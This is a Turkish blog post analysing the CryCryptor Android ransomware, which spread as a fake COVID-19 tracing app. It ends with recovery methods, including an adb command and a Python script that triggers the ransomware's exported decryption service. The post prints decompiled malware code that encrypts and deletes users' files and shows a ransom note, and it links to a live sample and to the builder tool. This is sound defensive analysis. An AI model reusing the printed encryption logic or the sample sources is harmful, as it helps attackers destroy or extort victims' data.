---
title:  "CryCryptor Mobil Malware(Ransomware) Analizi"
date:   2021-03-20T00:48:00-0400
categories:
  - malware
tags:
  - malware
  - android
---

Merhaba <br>
 Bu yazıda CryCryptor mobil zararlı yazılımını elimden geldiğince incelemeye ve açıklamaya çalışacağım. Öncelikle malware analizi konusunda pek de bir şey bilmediğimden ötürü yazı teknik açıdan pek de dolu olmayabilir ama böyle böyle öğrenmeye çalışıyoruz bi şeyler :)

> Açıklama: Bu yazıda göreceğiniz zararlı yazılımın incelemesi Lukas Stefanko tarafından hazırlanan videoda  ayrıntılı bir şekilde yapılmıştır ve ben de o videodan yararlanarak bu yazıyı hazırlıyorum.  <br>
İlgili video: [Analysis of CryCryptor Android Ransomware and how I created decryptor | fake COVID-19 tracing app](https://www.youtube.com/watch?v=deyBbSKKGk8&list=PLMhhrHgJSE7br504MrX74h-wVr2-B1gWB&index=1)

Öncelikle bu zararlı yazılımın nasıl yayılmaya çalıştığına bakarsanız videoda anlatıldığı üzere Kanada halkını hedefleyen bir covid19 takip programı gibi yayıldığını görebilirsiniz. Uygulama aslında linuxchoise isimli github hesabından CryDroid adlı bir tool şeklinde paylaşıldıktan hemen sonra zararlı apk dosyaları oluşturulup yayılmaya başlıyor. Github bu repoyu kaldırmış ancak CryDroid diye aratırsanız başka hesaplarda da bulabiliyorsunuz, mesela: https://github.com/benniraj25/crydroid <br>Sanırım bu araç eğitim amaçlı oluşturulmuş bir araç ancak malwareci arkadaşlar bunu "hazır ne güzel ransom yazmışlar" diyerekten kullanmışlar. 
Ben kendim kodu çalıştırıp apk oluşturmadım ancak Eset'in paylaştığı IOC ile sample elde edebiliyoruz.
```
https://www.welivesecurity.com/2020/06/24/new-ransomware-uses-covid19-tracing-guise-target-canada-eset-decryptor/

Paket: com.crydroid
Hash: 322AAB72228B1A9C179696E600C1AF335B376655
```
Bu hashi internette arattığımızda abuse.ch sitesinde sample buluyoruz: [Link](https://bazaar.abuse.ch/sample/faa0efaad40e78bf27ca529171aaf0551db998a276d4ff501209d1f5ef830dfb/)
 İndirdiğimiz zipten "infected" parolasını kullanarak apk dosyasını çıkardıktan sonra analize başlayabiliriz. Önce kod üzerinden ne yaptığına bakıp sonra da şifreli dosyaları nasıl geri getireceğimizi anlatmaya çalışacağım.

 ## Kod Analizi
 Apk dosyasını jadx ile açıp manifest dosyasına bakalım.
 ```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="29" android:compileSdkVersionCodename="10" package="com.crydroid" platformBuildVersionCode="29" platformBuildVersionName="10">
    <uses-sdk android:minSdkVersion="16" android:targetSdkVersion="29"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.QUICKBOOT_POWERON"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <application android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:screenOrientation="portrait" android:allowBackup="true" android:supportsRtl="true">
        <activity android:name="com.crydroid.ui.MainActivity">
            <intent-filter>
                <category android:name="android.intent.category.LAUNCHER"/>
                <action android:name="android.intent.action.MAIN"/>
            </intent-filter>
        </activity>
        <service android:name="com.crydroid.services.EncryptionService" android:enabled="true" android:exported="true"/>
        <service android:name="com.crydroid.services.LaunchService" android:enabled="true" android:exported="true"/>
        <service android:name="com.crydroid.services.DecryptionService" android:enabled="true" android:exported="true"/>
        <receiver android:name="com.crydroid.receivers.BootCompletedReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED" android:enabled="true" android:exported="true">
            <intent-filter>
                <category android:name="android.intent.category.DEFAULT"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
            </intent-filter>
        </receiver>
        <meta-data android:name="android.support.VERSION" android:value="25.4.0"/>
    </application>
</manifest>
 ```
 Şimdi buradan anladığımız kadarı ile uygulamanın main activitysi "com.crydroid.ui.MainActivity" imiş. Ayrıca aldığı izinlere bakarsak uygulama
 - internet erişimi
 - dosya yazma işlemi
 - boot işleminin tamamlanmasını kontrol etme
gibi izinler istiyor. Alt tarafta ise 3 adet export edilmiş servis var. Burada ise bizim işimize yarayacak olanı decryption service, ona en son geleceğiz. Şimdi main activityden başlayalım.
```java
public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        e();
        StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build());
        c();
        this.a = (TextView) findViewById(R.id.text);
        this.b = (Button) findViewById(R.id.decrypt);
        f();
        try {
            if (a().booleanValue() && !b().booleanValue()) {
                startService(new Intent(this, EncryptionService.class));
                Toast.makeText(this, "Error 4432", 0).show();
                finish();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
```
Main activity çalıştığında ilk çalışacak oaln oncreate metoduna bakarsak e,c ve f şeklinde metodlar çağırılmış.
```java
private void e() {
        SharedPreferences sharedPreferences = getSharedPreferences("prefs", 0);
        if (sharedPreferences.getString("uuid", null) == null) {
            sharedPreferences.edit().putString("uuid", UUID.randomUUID().toString()).apply();
        }
        if (sharedPreferences.getString("com.crydroid.PASSWORD", null) == null) {
            sharedPreferences.edit().putString("com.crydroid.PASSWORD", d()).apply();
        }
    }
```
e metodunda önce sharedPreferences içerisinde uuid isminde bir değer var mı diye kontrol ediyor, eğer yok ise "uuid" isminde bir key ile random bir uuid ataması yapıp shred prefs'e yazıyor. Ardından "com.crydroid.PASSWORD" isminde bir değer var mı diye bakıyor ve yoksa bu isimde bir değer ekliyor. Bu değeri oluşturmak için de "d" metodunu çağırıyor.
```java
    private String d() {
        b.C0020b bVar = new b.C0020b();
        bVar.a(true);
        bVar.b(true);
        bVar.c(false);
        bVar.d(true);
        return bVar.a().a(16);
    }
```
d metodu değer döndürürken a(16) şeklinde bir fonksiyon çağrısı yapıyor. Yani bu değer bizim passwordumuz olacak.
```java
public String a(int i2) {
        if (i2 <= 0) {
            return "";
        }
        StringBuilder sb = new StringBuilder(i2);
        Random random = new Random(System.nanoTime());
        ArrayList arrayList = new ArrayList(4);
        if (this.a) {
            arrayList.add("abcdefghijklmnopqrstuvwxyz");
        }
        if (this.b) {
            arrayList.add("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
        }
        if (this.c) {
            arrayList.add("0123456789");
        }
        if (this.d) {
            arrayList.add("!@#$%&*()_+-=[]|,./?><");
        }
        for (int i3 = 0; i3 < i2; i3++) {
            String str = (String) arrayList.get(random.nextInt(arrayList.size()));
            sb.append(str.charAt(random.nextInt(str.length())));
        }
        return new String(sb);
    }
```
Bu a fonksiyonuna d fonksiyonundan çağırılırken 16 yollanıyordu, bu 16 sayısı bizim passwordumuzun uzunluğunu belirleyen değer olmuş oluyor. Harf,rakam ve özel karakterlerden oluşan bir karakter setinden random şekilde 16 karakter seçip bir password oluşturmuş oluyor.<br>
Şimdi en baştaki ikinci fonksiyon olan c fonksiyonuna bakalım.
```java
private void c() {
        if (Build.VERSION.SDK_INT >= 26) {
            ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(new NotificationChannel("channel1", "channel1", 4));
        }
    }
```
Bu fonksiyonda tam olarak ne yaptığını anlamasam da cihazın api versiyonuna göre bir bildirim kanalı oluşturuyor. Bu özellik api 26'dan sonra eklendiği için böyle bir kontrol yapma ihtiyacı duymuş. https://developer.android.com/reference/android/app/NotificationChannel
<br>Şimdi f fonksiyonuna bakalım.

```java
//com.crydroid.ui.c
public /* synthetic */ void a(View view) {
        String trim = this.b.getText().toString().trim();
        String string = getContext().getSharedPreferences("prefs", 0).getString("com.crydroid.PASSWORD", null);
        Log.d("MEONER", "onCreate: " + string);
        if (trim.equals(string)) {
            Intent intent = new Intent(getContext(), DecryptionService.class);
            Toast.makeText(getContext(), "Decryption started", 0).show();
            getContext().startService(intent);
        } else {
            Toast.makeText(getContext(), "Incorrect password", 0).show();
        }
        dismiss();
    }

```
Şimdi burada f fonksiyonu yerine onu takip edince çıkan fonksiyonun kodunu koymayı tercih ettim. f fonksiyonu çağırılırınca bir onClick listener tanımlanıyor. Bunun içerisinde tanımlanan a fonksiyonunda ise password kontorlü yapılıyor. Bizim textbox a girdiğimiz string ile shared prefsden aldığı string aynı ise en başta manifest dosyasında görmüş olduğumuz DecryptionService servisi intent ile tetikleniyor ve burada intent ile birlikte herhangi bir parola da gönderilmiyor. Zaten "com.crydroid.services.DecryptionService" isimli servise bakarsanız 

```
private SharedPreferences a
```
şeklinde bir tanımlama yapıp onun üzerinden parolaya erişiyor ve ardından decrypion işlemlerini gerçekleştiriyor. Neyse ana olaydan kopmadan geri dönelim. En başta onCreateye bakıyorduk. f fonksiyonu da çağırıldıktan sonra bir if bloğu var.

```java
if (a().booleanValue() && !b().booleanValue()) {
                startService(new Intent(this, EncryptionService.class));
                Toast.makeText(this, "Error 4432", 0).show();
                finish();
            }
```
burada a fonksiyonu yazma iznini kontrol ediyor.

```java
public Boolean a() {
        if (f.a.b.b.a.a(getBaseContext(), "android.permission.WRITE_EXTERNAL_STORAGE") == 0) {
            return true;
        }
        f.a.b.a.a.a(this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE"}, 123);
        return a();
    }
```
b fonksiyonuna bakalım

```java
private Boolean b() {
        SharedPreferences sharedPreferences = getSharedPreferences("prefs", 0);
        if (sharedPreferences.getBoolean("FINISHED", false)) {
            if (sharedPreferences.getBoolean("Unlocked. Personal files decrypted", false)) {
                this.a.setText("Unlocked. Personal files decrypted");
                this.b.setVisibility(8);
            } else {
                String string = getSharedPreferences("prefs", 0).getString("uuid", "null");
                this.a.setText("Your files have been Encrypted!\nSend an Email to rescue them: supportdoc@protonmail.ch\nYour id is " + string);
                this.b.setVisibility(0);
            }
            return true;
        }
        this.b.setVisibility(8);
        this.a.setText("Please wait. Initializing");
        return false;
    }
```
Bu fonksiyonda ise shared prefsten aldığı "FINISHED" ve "Unlocked. Personal files decrypted" isimli değerleri alıyor ve bunlar false dönerse dosyalar decrypt edilmiş manasına geliyor. Aksi halde ise şu şu adrese mail at diye text basıyor. Dosyalar şifrelendikten sonra shared preferences altındaki prefs.xml dosyasına bakarsanız bu değerleri görebilirsiniz.
```sh
vbox86p:/data/data/com.crydroid/shared_prefs # cat prefs.xml                                                                                                                                                                               
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="com.crydroid.PASSWORD">1b8H1k4B5CnkWacN</string>
    <boolean name="FINISHED" value="true" />
    <string name="uuid">2e2614dc-b304-4854-b09c-18bed5c9ebf8</string>
</map>
```
Yani sonuç olarak a fonksiyonu true b fonksiyonu da false dönerse cihazda herhangi bir işlem daha yapılmadı manasına geliyor ve "EncryptionService" servisi çalıştırılarak yine decryptionda olduğu gibi shared prefsden parola alınıp dosyalar şifreleniyor.Bu işlem yapılırken de belirli uzantılara sahip dosyalarda şifreleme yapılıyor ve dosyaların orjinalleri silinip yerlerine ".enc" uzantılı şifrelenmiş dosyalar konuluyor.

```java
//com.crydroid.services.EncryptionService
public /* synthetic */ void c() {
        g();
        String[] strArr = {"txt", "jpg", "bmp", "png", "pdf", "doc", "docx", "ppt", "pptx", "avi", "xls", "xlsx", "VCF", "pdf", "db"};
        File file = new File("/storage/emulated/0");
        k.a.a.a.f.f fVar = j.b;
        for (File file2 : (List) k.a.a.a.b.a(file, fVar, fVar)) {
            try {
                String canonicalPath = file2.getCanonicalPath();
                if (k.a.a.b.a.a(strArr, k.a.a.a.c.a(canonicalPath))) {
                    b(canonicalPath);
                    file2.delete();
                }
            } catch (Exception unused) {
            }
        }
        try {
            a();
            d();
            stopSelf();
        } catch (Exception unused2) {
        }
    }
```

## Dosyaları Kurtarma

Şimdi şifreleme işlemleri bu şekilde arkada dönüyor, sıra geldi bu dosyaları kurtarmaya. Bunun için bir kaç yol var:
1. Shared preferencesden parolayı okumak
2. Export edilen servisi adb ile tetiklemek
3. CryDecryptor apk dosyası ile expert edilen servisi tetiklemek(2. seçeneğin apk yapılmış hali diyebiliriz.)

Bunları sırayla anlatayım<br>
1. İlk seçenek olan shared preferencesdan parola okuma işlemini adb ile yapabilirsiniz. Yukarıda da örneğini attığım prefs dosyasını okumak için "/data/data/com.crydroid/shared_prefs" dizinine gidip dosyayı okumak yeterli.
2. Hatırlarsanız en başta manifest dosyasında export edilen servisler vardı ve bunlardan biri de decryption servisi idi ve yine yukarılarda söylediğim gibi bu servis parolanın kendisini istemeden sadece intent ile tetiklenebiliyordu. Bu olaydan faydalanarak
```
adb shell am startservice com.crydroid/.services.DecryptionService
```
komutu ile bu servisi tetikleyebilir ve dosyaları decrypt edebilirsiniz. Bu işlemleri otomatikleştirmek için ufak bir python scripti yazdım. Onu kullanarak da eğer cihazınızda bu ransom var ise bunu bulup dosyaları kurtarmak ve uygulamayı silmek için kullanabilirsiniz.

```python
from ppadb.client import Client as AdbClient

#get device list over adb
client = AdbClient()
devices = client.devices()
my_device = devices[0]

def is_ransom_installed(device):
    return device.is_installed("com.crydroid")

if is_ransom_installed(my_device):
    print("CryCryptor detected! Started removing...")
    my_device.shell("am startservice com.crydroid/.services.DecryptionService")
    print("Files are decrypted!")
    my_device.uninstall("com.crydroid")
    print("Ransom deleted!")
else:
    print("CryCryptor not found!")
```

3. Bu araştırmayı yapıp analizi videoda anlatan Lukas Stefanko'nun hazırladığı bir apk dosyası var. Bu apk da aynı şekilde intent tanımlayarak dosyaları kurtarma işlemini gerçekleştiriyor. https://github.com/eset/cry-decryptor

<br>

Evet bu yazı bu kadardı, biraz karman çorman da olsa anlatmaya çalıştım umarım birilerinin işine yarar. Bir sonraki yazıda buluşmak üzere...
Kaynakça:
- https://www.youtube.com/watch?v=deyBbSKKGk8&list=PLMhhrHgJSE7br504MrX74h-wVr2-B1gWB&index=2
- https://www.welivesecurity.com/2020/06/24/new-ransomware-uses-covid19-tracing-guise-target-canada-eset-decryptor/
- http://court-of-testing-analysing.blogspot.com/2020/07/taking-back-whats-yours-defeating.html
- https://developer.android.com/reference/android/app/NotificationChannel
- https://bazaar.abuse.ch/sample/faa0efaad40e78bf27ca529171aaf0551db998a276d4ff501209d1f5ef830dfb
